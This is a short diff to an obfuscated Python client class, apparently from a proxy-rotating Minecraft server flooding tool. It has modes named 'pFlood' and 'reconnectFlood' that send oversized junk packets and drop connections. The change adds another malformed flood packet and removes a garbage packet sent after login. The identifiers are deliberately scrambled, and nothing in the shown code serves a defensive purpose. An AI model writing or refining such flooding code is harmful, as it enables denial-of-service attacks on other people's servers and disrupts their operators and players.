@@ -285,6 +285,7 @@ class CraftPlayer :
                 if OOO0000OO0O0000OO =='pFlood':
                     OOO0000OO0O0000OO =0
                     OO0OOOO0O00O0OO00 ._socket .sendall ('\x01'+CraftString ('aaaaaaaaaaaaaaa;'+'a'*500 ))
+                    OO0OOOO0O00O0OO00 .SendPacket ('aaaaaaaaaaaaaaaaaaaaaaaaaaaaa;'+'a'*500)
                     OO0OOOO0O00O0OO00 ._socket .close ()
                 if OOO0000OO0O0000OO =='reconnectFlood':
                     OO0OOOO0O00O0OO00 ._socket .close ()
@@ -342,7 +343,6 @@ class CraftPlayer :
             O0OOOOO00OOO00000 ._socket .connect ((_O0O0OO0OOO0000O0O ,_O0O0O00OO0OOOO000 ))
             O0OOOOO00OOO00000 .SendPacket ('\x00'+encode_varint (O0OOOOO00OOO00000 ._protonum )+CraftString (_O0O0OO0OOO0000O0O )+struct .pack ('>h',_O0O0O00OO0OOOO000 )+encode_varint (2 ))
             O0OOOOO00OOO00000 .SendPacket ('\x00'+CraftString (O0OOOOO00OOO00000 ._nickname ))
-            O0OOOOO00OOO00000 .SendPacket ('ajksdkjasdkjaskdjakjsdjkasdkjakjsdkjasdk')
         except :
             ProxyManager .badProxy (O0OOOOO00OOO00000 ._proxy )
             return
